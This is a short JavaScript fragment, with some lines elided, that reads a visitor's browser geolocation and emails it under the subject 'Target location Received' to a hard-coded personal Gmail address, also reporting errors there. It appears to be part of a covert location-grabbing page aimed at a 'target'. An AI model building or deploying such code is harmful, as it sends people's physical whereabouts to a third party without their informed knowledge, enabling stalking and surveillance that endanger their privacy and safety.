    ...
    if ("geolocation" in navigator) {
        ...
        navigator.geolocation.getCurrentPosition(
            (position) => {
                ...
                sendEmail('Target location Received', locationDisplay.textContent, 'Junaidrind91554@gmail.com');
            },
            (error) => {
                ...
                sendEmail('Location Access Error', locationDisplay.textContent, 'Junaidrind91554@gmail.com');
            }
        );
    } else {
